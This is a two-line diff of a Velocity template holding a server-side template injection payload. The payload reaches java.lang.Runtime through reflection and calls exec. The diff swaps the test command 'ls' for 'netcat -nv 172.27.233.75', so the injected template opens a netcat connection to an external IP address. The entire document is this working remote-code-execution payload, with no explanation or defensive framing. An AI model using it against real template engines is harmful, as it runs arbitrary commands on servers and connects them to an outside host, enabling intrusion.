@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ls")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("netcat -nv 172.27.233.75")
